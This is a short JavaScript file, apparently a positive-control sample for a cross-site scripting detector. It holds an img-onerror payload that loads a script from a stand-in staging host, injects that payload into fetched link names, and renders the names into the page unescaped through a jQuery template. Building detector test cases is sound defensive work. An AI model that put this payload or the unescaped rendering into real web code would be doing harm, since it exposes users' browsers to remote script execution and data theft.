// Static positive control: the entire loader is inside the handler literal.
// Never execute or fetch the endpoint or stage.
let links = [];
const injectedName = `"><img src=x onerror='var s=document.createElement("script");s.src="//stage.example.invalid/payload.js";document.head.appendChild(s)'>`;
fetch('https://catalog-provider.net/links').then(response => response.json()).then(data => {
    for (const link of data) link.name = injectedName;
    links = data; renderLinks();
});
function renderLinks() {
    for (const link of links) {
        const item = $(`<a href="${link.url}" class="shortcutLink"><p>${link.name}</p></a>`);
        $('#shortcuts').append(item);
    }
}
